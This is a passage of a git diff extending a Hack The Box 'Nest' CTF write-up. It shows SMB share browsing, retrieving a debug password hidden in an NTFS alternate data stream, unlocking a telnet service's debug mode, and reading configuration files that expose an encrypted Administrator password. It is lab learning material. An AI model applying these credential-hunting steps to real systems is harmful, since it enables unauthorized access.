@@ -634,3 +634,275 @@ DEBUG <Password>
 HELP <Command>
 >
 ```
+Nothing in Telnet this was a major rabit hole
+
+lets go back to the smbclient
+
+### SMB Client
+
+```console
+noob2uub@kali:~/ctf/htb/nest$ smbclient -U c.smith //10.10.10.178/Users xRxRxPANCAK3SxRxRx
+Try "help" to get a list of possible commands.
+smb: \> cd C.Smith
+smb: \C.Smith\> ls
+  .                                   D        0  Sat Jan 25 23:21:44 2020
+  ..                                  D        0  Sat Jan 25 23:21:44 2020
+  HQK Reporting                       D        0  Thu Aug  8 16:06:17 2019
+  user.txt                            A       34  Mon May  2 13:37:20 2022
+
+		5242623 blocks of size 4096. 1840207 blocks available
+smb: \C.Smith\> cd HQK Reporting\
+cd \C.Smith\HQK\: NT_STATUS_OBJECT_NAME_NOT_FOUND
+smb: \C.Smith\> cd HQK Reporting\
+cd \C.Smith\HQK\: NT_STATUS_OBJECT_NAME_NOT_FOUND
+smb: \C.Smith\> cd HQK Reporting
+cd \C.Smith\HQK\: NT_STATUS_OBJECT_NAME_NOT_FOUND
+smb: \C.Smith\> cd "HQK Reporting"
+smb: \C.Smith\HQK Reporting\> list
+0:	server=10.10.10.178, share=Users
+smb: \C.Smith\HQK Reporting\> dir
+  .                                   D        0  Thu Aug  8 16:06:17 2019
+  ..                                  D        0  Thu Aug  8 16:06:17 2019
+  AD Integration Module               D        0  Fri Aug  9 05:18:42 2019
+  Debug Mode Password.txt             A        0  Thu Aug  8 16:08:17 2019
+  HQK_Config_Backup.xml               A      249  Thu Aug  8 16:09:05 2019
+
+		5242623 blocks of size 4096. 1840207 blocks available
+smb: \C.Smith\HQK Reporting\> allinfo
+allinfo <file>
+smb: \C.Smith\HQK Reporting\> allinfo Debug Mode Password.txt 
+NT_STATUS_OBJECT_NAME_NOT_FOUND getting alt name for \C.Smith\HQK Reporting\Debug
+smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt" 
+altname: DEBUGM~1.TXT
+create_time:    Thu Aug  8 04:06:12 PM 2019 PDT
+access_time:    Thu Aug  8 04:06:12 PM 2019 PDT
+write_time:     Thu Aug  8 04:08:17 PM 2019 PDT
+change_time:    Wed Jul 21 11:47:12 AM 2021 PDT
+attributes: A (20)
+stream: [::$DATA], 0 bytes
+stream: [:Password:$DATA], 15 bytes
+smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt":Password 
+getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \C.Smith\HQK Reporting\> 
+```
+
+I did have to get a hint on this one, I was stuck for a while and found the allinfo command, which let me down the line of finding :Passwords. having a password.txt file with 0 bytes was a tip off.
+
+But whose password is this.... 
+
+There was that DEBUG tool in telnet, lets take a look. 
+
+### Telnet
+
+```console
+noob2uub@kali:~/ctf/htb/nest$ telnet 10.10.10.178 4386
+Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is '^]'.
+
+HQK Reporting Service V1.2
+
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  COMPARISONS
+[1]   Invoices (Ordered By Customer)
+[2]   Products Sold (Ordered By Customer)
+[3]   Products Sold In Last 30 Days
+
+Current Directory: ALL QUERIES
+>help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+>DEBUG WBQ201953D8w
+
+Debug mode enabled. Use the HELP command to view additional commands that are now available
+>help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+SERVICE
+SESSION
+SHOWQUERY <Query_ID>
+``` 
+We have a few more commands Service and Session
+
+### Service
+
+```console
+--- HQK REPORTING SERVER INFO ---
+
+Version: 1.2.0.0
+Server Hostname: HTB-NEST
+Server Process: "C:\Program Files\HQK\HqkSvc.exe"
+Server Running As: Service_HQK
+Initial Query Directory: C:\Program Files\HQK\ALL QUERIES
+```
+### Session
+
+```console
+>session
+
+--- Session Information ---
+
+Session ID: fcb3c67b-1bae-431c-8136-6bbc7ca79366
+Debug: True
+Started At: 5/2/2022 9:56:39 PM
+Server Endpoint: 10.10.10.178:4386
+Client Endpoint: 10.10.14.14:56312
+Current Query Directory: C:\Program Files\HQK\ALL QUERIES
+```
+
+### List Query 
+
+```console
+noob2uub@kali:~/ctf/htb/nest$ telnet 10.10.10.178 4386
+Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is '^]'.
+
+HQK Reporting Service V1.2
+
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  COMPARISONS
+[1]   Invoices (Ordered By Customer)
+[2]   Products Sold (Ordered By Customer)
+[3]   Products Sold In Last 30 Days
+
+Current Directory: ALL QUERIES
+``` 
+lets start looking at these 
+
+```console
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+SERVICE
+SESSION
+SHOWQUERY <Query_ID>
+
+>runquery 1
+
+Invalid database configuration found. Please contact your system administrator
+>showquery 1
+
+TITLE=Invoices (Ordered By Customer)
+QUERY_MODE=VIEW
+QUERY_TYPE=INVOICE
+SORTBY=CUSTOMER
+DATERANGE=ALL
+
+>showquery 2
+
+TITLE=Products Sold (Ordered By Customer)
+QUERY_MODE=VIEW
+QUERY_TYPE=PRODUCT
+SORTBY=CUSTOMER
+DATERANGE=ALL
+
+>showquery 3
+
+TITLE=Products Sold In Last 30 Days
+QUERY_MODE=VIEW
+QUERY_TYPE=PRODUCT
+DATERANGE=LAST30
+
+```
+I don't see anything that really helps me so lets go through the directories. 
+
+```console
+>setdir ..
+
+Current directory set to HQK
+>ls
+
+Unrecognised command
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  ALL QUERIES
+[DIR]  LDAP
+[DIR]  Logs
+[1]   HqkSvc.exe
+[2]   HqkSvc.InstallState
+[3]   HQK_Config.xml
+
+Current Directory: HQK
+>showquery 1
+
+File over size limit. Are you sure this is a HQK query file?
+>showquery 2
+
+<?xml version="1.0" encoding="utf-8"?><ArrayOfKeyValueOfanyTypeanyType xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns:x="http://www.w3.org/2001/XMLSchema" z:Id="1" z:Type="System.Collections.Hashtable" z:Assembly="0" xmlns:z="http://schemas.microsoft.com/2003/10/Serialization/" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><LoadFactor z:Id="2" z:Type="System.Single" z:Assembly="0" xmlns="">0.72</LoadFactor><Version z:Id="3" z:Type="System.Int32" z:Assembly="0" xmlns="">2</Version><Comparer i:nil="true" xmlns="" /><HashCodeProvider i:nil="true" xmlns="" /><HashSize z:Id="4" z:Type="System.Int32" z:Assembly="0" xmlns="">3</HashSize><Keys z:Id="5" z:Type="System.Object[]" z:Assembly="0" z:Size="2" xmlns=""><anyType z:Id="6" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">_reserved_nestedSavedStates</anyType><anyType z:Id="7" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">_reserved_lastInstallerAttempted</anyType></Keys><Values z:Id="8" z:Type="System.Object[]" z:Assembly="0" z:Size="2" xmlns=""><anyType z:Id="9" z:Type="System.Collections.IDictionary[]" z:Assembly="0" z:Size="1" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><ArrayOfKeyValueOfanyTypeanyType z:Id="10" z:Type="System.Collections.Hashtable" z:Assembly="0"><LoadFactor z:Id="11" z:Type="System.Single" z:Assembly="0" xmlns="">0.72</LoadFactor><Version z:Id="12" z:Type="System.Int32" z:Assembly="0" xmlns="">2</Version><Comparer i:nil="true" xmlns="" /><HashCodeProvider i:nil="true" xmlns="" /><HashSize z:Id="13" z:Type="System.Int32" z:Assembly="0" xmlns="">3</HashSize><Keys z:Id="14" z:Type="System.Object[]" z:Assembly="0" z:Size="2" xmlns=""><anyType z:Ref="6" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Ref="7" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /></Keys><Values z:Id="15" z:Type="System.Object[]" z:Assembly="0" z:Size="2" xmlns=""><anyType z:Id="16" z:Type="System.Collections.IDictionary[]" z:Assembly="0" z:Size="2" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><ArrayOfKeyValueOfanyTypeanyType z:Id="17" z:Type="System.Collections.Hashtable" z:Assembly="0"><LoadFactor z:Id="18" z:Type="System.Single" z:Assembly="0" xmlns="">0.72</LoadFactor><Version z:Id="19" z:Type="System.Int32" z:Assembly="0" xmlns="">6</Version><Comparer i:nil="true" xmlns="" /><HashCodeProvider i:nil="true" xmlns="" /><HashSize z:Id="20" z:Type="System.Int32" z:Assembly="0" xmlns="">7</HashSize><Keys z:Id="21" z:Type="System.Object[]" z:Assembly="0" z:Size="5" xmlns=""><anyType z:Ref="7" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Ref="6" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Id="22" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">hadServiceLogonRight</anyType><anyType z:Id="23" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">Account</anyType><anyType z:Id="24" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">Username</anyType></Keys><Values z:Id="25" z:Type="System.Object[]" z:Assembly="0" z:Size="5" xmlns=""><anyType z:Id="26" z:Type="System.Int32" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">-1</anyType><anyType z:Id="27" z:Type="System.Collections.IDictionary[]" z:Assembly="0" z:Size="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Id="28" z:Type="System.Boolean" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">true</anyType><anyType z:Id="29" z:Type="System.ServiceProcess.ServiceAccount" z:Assembly="System.ServiceProcess, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">User</anyType><anyType z:Id="30" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">.\service_hqk</anyType></Values></ArrayOfKeyValueOfanyTypeanyType><ArrayOfKeyValueOfanyTypeanyType z:Id="31" z:Type="System.Collections.Hashtable" z:Assembly="0"><LoadFactor z:Id="32" z:Type="System.Single" z:Assembly="0" xmlns="">0.72</LoadFactor><Version z:Id="33" z:Type="System.Int32" z:Assembly="0" xmlns="">4</Version><Comparer i:nil="true" xmlns="" /><HashCodeProvider i:nil="true" xmlns="" /><HashSize z:Id="34" z:Type="System.Int32" z:Assembly="0" xmlns="">7</HashSize><Keys z:Id="35" z:Type="System.Object[]" z:Assembly="0" z:Size="3" xmlns=""><anyType z:Id="36" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">installed</anyType><anyType z:Ref="7" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Ref="6" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /></Keys><Values z:Id="37" z:Type="System.Object[]" z:Assembly="0" z:Size="3" xmlns=""><anyType z:Id="38" z:Type="System.Boolean" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">true</anyType><anyType z:Id="39" z:Type="System.Int32" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">0</anyType><anyType z:Id="40" z:Type="System.Collections.IDictionary[]" z:Assembly="0" z:Size="1" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><ArrayOfKeyValueOfanyTypeanyType z:Id="41" z:Type="System.Collections.Hashtable" z:Assembly="0"><LoadFactor z:Id="42" z:Type="System.Single" z:Assembly="0" xmlns="">0.72</LoadFactor><Version z:Id="43" z:Type="System.Int32" z:Assembly="0" xmlns="">6</Version><Comparer i:nil="true" xmlns="" /><HashCodeProvider i:nil="true" xmlns="" /><HashSize z:Id="44" z:Type="System.Int32" z:Assembly="0" xmlns="">7</HashSize><Keys z:Id="45" z:Type="System.Object[]" z:Assembly="0" z:Size="5" xmlns=""><anyType z:Ref="7" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Id="46" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">alreadyRegistered</anyType><anyType z:Id="47" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">baseInstalledAndPlatformOK</anyType><anyType z:Ref="6" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Id="48" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">logExists</anyType></Keys><Values z:Id="49" z:Type="System.Object[]" z:Assembly="0" z:Size="5" xmlns=""><anyType z:Id="50" z:Type="System.Int32" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">-1</anyType><anyType z:Id="51" z:Type="System.Boolean" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">false</anyType><anyType z:Id="52" z:Type="System.Boolean" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">true</anyType><anyType z:Id="53" z:Type="System.Collections.IDictionary[]" z:Assembly="0" z:Size="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Id="54" z:Type="System.Boolean" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">true</anyType></Values></ArrayOfKeyValueOfanyTypeanyType></anyType></Values></ArrayOfKeyValueOfanyTypeanyType></anyType><anyType z:Id="55" z:Type="System.Int32" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">1</anyType></Values></ArrayOfKeyValueOfanyTypeanyType></anyType><anyType z:Id="56" z:Type="System.Int32" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">0</anyType></Values></ArrayOfKeyValueOfanyTypeanyType>
+
+>showquery 3
+
+<?xml version="1.0"?>
+<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <Port>4386</Port>
+  <DebugPassword>WBQ201953D8w</DebugPassword>
+  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
+</ServiceSettings>
+
+>
+```
+Nothing good here, there was a logs folder that had a txt file that I couldnt query, so I decided to look at the LDAP folder.
+
+```console
+Current directory set to LDAP
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[1]   HqkLdap.exe
+[2]   Ldap.conf
+
+Current Directory: LDAP
+>showquery 2
+
+Domain=nest.local
+Port=389
+BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+```
+
+We have a password now.
+
+yup again this is encrpyted Ë!*ÑKï..®@ç..Ê^...Aèj..ß)×.þHÄU¾ 
+
+Lets run it against the VS Code 
+
+
